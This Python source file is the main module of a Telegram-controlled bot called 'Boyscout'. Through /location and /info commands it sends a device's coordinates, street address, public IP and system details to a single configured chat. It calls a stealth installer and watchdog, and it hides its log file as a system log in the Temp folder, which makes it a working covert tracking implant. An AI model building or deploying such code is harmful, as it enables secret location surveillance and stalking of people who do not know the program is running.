"""Telegram bot handlers and main run loop"""
import os
import sys
import time
import logging
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

from .device import get_device_name, get_device_info
from .location import get_location_data
from .stealth import install_stealth, run_watchdog, check_if_running_stealth

try:
    from config import (
        TELEGRAM_BOT_TOKEN,
        YOUR_TELEGRAM_CHAT_ID,
        ENABLE_STEALTH_MODE
    )
except ImportError:
    print("Error: config.py not found!")
    print("Please copy config.example.py to config.py and fill in your API keys.")
    sys.exit(1)


def setup_logging():
    """Configure logging to temp directory."""
    log_dir = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), '.syslog')
    os.makedirs(log_dir, exist_ok=True)
    log_file = os.path.join(log_dir, 'system.log')
    logging.basicConfig(
        filename=log_file,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command."""
    device_name = get_device_name()
    await update.message.reply_text(
        f"Boyscout\n"
        f"Device: {device_name}\n\n"
        f"Commands:\n"
        f"/location - Get device location\n"
        f"/info - Get device information\n"
        f"/help - Show this message"
    )


async def location_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /location command."""
    if str(update.effective_chat.id) != YOUR_TELEGRAM_CHAT_ID:
        await update.message.reply_text("Unauthorized access")
        logging.warning(f"Unauthorized location request from chat_id: {update.effective_chat.id}")
        return
    
    device_name = get_device_name()
    await update.message.reply_text(f"Locating {device_name}...")
    
    location_data = get_location_data()
    device_info = get_device_info()
    
    if location_data['latitude'] and location_data['longitude']:
        await update.message.reply_location(
            latitude=location_data['latitude'],
            longitude=location_data['longitude']
        )
        google_maps_link = f"https://www.google.com/maps?q={location_data['latitude']},{location_data['longitude']}"
        message = (
            f"Device Located\n\n"
            f"Device: {device_name}\n"
            f"System: {device_info}\n"
            f"Method: {location_data['method']}\n"
            f"Coordinates: {location_data['latitude']}, {location_data['longitude']}\n"
            f"Address: {location_data['address'] or 'Not available'}\n"
            f"IP: {location_data['ip_address'] or 'Not available'}\n\n"
            f"Google Maps: {google_maps_link}"
        )
        await update.message.reply_text(message)
        logging.info(f"Location sent for {device_name}")
    else:
        await update.message.reply_text(
            f"Unable to determine location for {device_name}\n"
            f"Device: {device_info}\n\n"
            "The device may not have internet access or location services are unavailable."
        )
        logging.warning(f"Location unavailable for {device_name}")


async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /info command."""
    if str(update.effective_chat.id) != YOUR_TELEGRAM_CHAT_ID:
        await update.message.reply_text("Unauthorized access")
        return
    
    device_name = get_device_name()
    device_info = get_device_info()
    
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
    except Exception:
        ip = "Unable to fetch"
    
    message = (
        f"Device Information\n\n"
        f"Device: {device_name}\n"
        f"System: {device_info}\n"
        f"Public IP: {ip}\n"
        f"Status: Online"
    )
    await update.message.reply_text(message)
    logging.info(f"Info sent for {device_name}")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command."""
    await start_command(update, context)


def run_bot():
    """Main entry point - run the Telegram bot."""
    setup_logging()
    
    if TELEGRAM_BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
        print("Error: Please set your Telegram bot token in config.py")
        return
    if YOUR_TELEGRAM_CHAT_ID == "YOUR_CHAT_ID_HERE":
        print("Error: Please set your Telegram chat ID in config.py")
        return
    
    if ENABLE_STEALTH_MODE and not check_if_running_stealth():
        if install_stealth():
            time.sleep(3)
            sys.exit(0)
    
    if ENABLE_STEALTH_MODE and check_if_running_stealth():
        if run_watchdog():
            return
    
    device_name = get_device_name()
    if not check_if_running_stealth():
        print(f"Boyscout running on {device_name}")
    logging.info(f"Boyscout started on {device_name}")
    
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("location", location_command))
    application.add_handler(CommandHandler("info", info_command))
    application.add_handler(CommandHandler("help", help_command))
    
    try:
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    except KeyboardInterrupt:
        logging.info(f"Boyscout stopped by user on {device_name}")
    except Exception as e:
        logging.error(f"Bot error on {device_name}: {e}")
